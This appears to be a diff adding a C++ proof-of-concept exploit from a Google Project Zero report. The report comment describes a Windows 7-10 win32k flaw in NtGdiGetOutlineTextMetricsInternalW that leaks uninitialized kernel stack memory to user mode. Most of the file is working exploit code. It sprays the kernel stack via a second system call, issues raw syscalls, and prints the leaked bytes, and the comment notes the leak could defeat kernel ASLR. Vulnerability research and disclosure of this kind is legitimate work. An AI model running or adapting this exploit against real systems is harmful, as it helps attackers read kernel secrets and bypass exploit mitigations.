@@ -1,0 +1,117 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1179
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory to user-mode applications in Windows 7-10 through the win32k!NtGdiGetOutlineTextMetricsInternalW system call.
+
+The system call returns an 8-byte structure back to ring-3 through the 4th parameter, as evidenced by the following assembly code (win32k.sys from Windows 7 32-bit):
+
+--- cut ---
+.text:BF87364A                 mov     edx, [ebp+arg_C]
+.text:BF87364D                 lea     ecx, [edx+8]
+.text:BF873650                 mov     eax, _W32UserProbeAddress
+.text:BF873655                 cmp     ecx, eax
+.text:BF873657                 ja      short loc_BF873662
+.text:BF873659                 cmp     ecx, edx
+.text:BF87365B                 jbe     short loc_BF873662
+.text:BF87365D                 test    dl, 3
+.text:BF873660                 jz      short loc_BF873665
+.text:BF873662
+.text:BF873662 loc_BF873662:
+.text:BF873662                 mov     byte ptr [eax], 0
+.text:BF873665
+.text:BF873665 loc_BF873665:
+.text:BF873665                 lea     esi, [ebp+var_24]
+.text:BF873668                 mov     edi, edx
+.text:BF87366A                 movsd
+.text:BF87366B                 movsd
+--- cut ---
+
+However, according to our experiments, only the first 4 bytes of the source structure (placed on the kernel stack) are initialized under normal circumstances, while the other 4 bytes are set to leftover data. In order to demonstrate the issue, we have created a proof-of-concept program which sprays 1024 bytes of the kernel stack with a 0x41 ('A') byte directly prior to triggering the vulnerability, with the help of the win32k!NtGdiEngCreatePalette system call. Then, the DWORD leaked via the discussed vulnerability is indeed equal to 0x41414141, as evidenced by the PoC output:
+
+--- cut ---
+C:\>NtGdiGetOutlineTextMetricsInternalW_stack.exe
+Data read: 41414141
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+// Own implementation of memset(), which guarantees no data is spilled on the local stack.
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Windows 7 32-bit.
+  CONST ULONG __NR_NtGdiEngCreatePalette = 0x129c;
+
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[1024];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  SystemCall32(__NR_NtGdiEngCreatePalette, 1, sizeof(buffer) / sizeof(DWORD), buffer, 0, 0, 0);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 7 32-bit.
+  CONST ULONG __NR_NtGdiGetOutlineTextMetricsInternalW = 0x10c6;
+
+  // Create a Device Context.
+  HDC hdc = CreateCompatibleDC(NULL);
+
+  // Create a TrueType font.
+  HFONT hfont = CreateFont(10,                  // nHeight
+                           10,                  // nWidth
+                           0,                   // nEscapement
+                           0,                   // nOrientation
+                           FW_DONTCARE,         // fnWeight
+                           FALSE,               // fdwItalic
+                           FALSE,               // fdwUnderline
+                           FALSE,               // fdwStrikeOut
+                           ANSI_CHARSET,        // fdwCharSet
+                           OUT_DEFAULT_PRECIS,  // fdwOutputPrecision
+                           CLIP_DEFAULT_PRECIS, // fdwClipPrecision
+                           DEFAULT_QUALITY,     // fdwQuality
+                           FF_DONTCARE,         // fdwPitchAndFamily
+                           L"Times New Roman");
+
+  // Select the font into the DC.
+  SelectObject(hdc, hfont);
+
+  // Spray the kernel stack to get visible results.
+  SprayKernelStack();
+
+  // Read the 4 uninitialized kernel stack bytes and print them on screen.
+  DWORD output[2] = { /* zero padding */ };
+  if (!SystemCall32(__NR_NtGdiGetOutlineTextMetricsInternalW, hdc, 0, NULL, output)) {
+    printf("NtGdiGetOutlineTextMetricsInternalW failed\n");
+    DeleteObject(hfont);
+    DeleteDC(hdc);
+    return 1;
+  }
+
+  printf("Data read: %x\n", output[1]);
+
+  // Free resources.
+  DeleteObject(hfont);
+  DeleteDC(hdc);
+
+  return 0;
+}
